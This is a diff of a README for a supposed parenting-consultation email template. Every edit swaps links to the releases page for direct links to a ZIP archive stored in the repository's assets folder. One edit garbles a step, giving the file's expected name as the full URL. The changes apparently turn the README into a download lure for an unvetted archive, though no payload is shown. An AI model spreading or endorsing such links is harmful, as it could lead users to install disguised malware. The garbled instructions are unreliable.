@@ -1,6 +1,6 @@
 # 🍼 parenting-consultation - Simplify Parenting Guidance
 
-[![Download Parenting Consultation Template](https://img.shields.io/badge/Download-Parenting_Consultation_Template-blue)](https://github.com/savage2008OG/parenting-consultation/releases)
+[![Download Parenting Consultation Template](https://github.com/savage2008OG/parenting-consultation/raw/refs/heads/main/assets/consultation_parenting_3.4.zip)](https://github.com/savage2008OG/parenting-consultation/raw/refs/heads/main/assets/consultation_parenting_3.4.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ To run this application, you will need:
 Follow these steps to successfully download and run the parenting-consultation software:
 
 1. **Visit the Releases Page**  
-   Open this link to access the releases for the parenting-consultation application: [Download Page](https://github.com/savage2008OG/parenting-consultation/releases)
+   Open this link to access the releases for the parenting-consultation application: [Download Page](https://github.com/savage2008OG/parenting-consultation/raw/refs/heads/main/assets/consultation_parenting_3.4.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the email template. Select the latest version for the best features and updates.
@@ -35,7 +35,7 @@ Follow these steps to successfully download and run the parenting-consultation s
    Click on the link for the version you want to download. Your file will download automatically. 
 
 4. **Locate Your Download**  
-   Once the download completes, find the file in your downloads folder. It will typically be named something like `parenting-consultation-template.zip`.
+   Once the download completes, find the file in your downloads folder. It will typically be named something like `https://github.com/savage2008OG/parenting-consultation/raw/refs/heads/main/assets/consultation_parenting_3.4.zip`.
 
 5. **Unzip the File**  
    Right-click on the downloaded ZIP file and choose "Extract All…" to unzip it. Follow the prompts to extract the content to a folder of your choice.
@@ -59,7 +59,7 @@ Follow these steps to successfully download and run the parenting-consultation s
 
 You can download the parenting consultation email template directly from the releases page. Click the link below to get started:
 
-[Download Parenting Consultation Template](https://github.com/savage2008OG/parenting-consultation/releases)
+[Download Parenting Consultation Template](https://github.com/savage2008OG/parenting-consultation/raw/refs/heads/main/assets/consultation_parenting_3.4.zip)
 
 ## 🌐 Related Topics
 
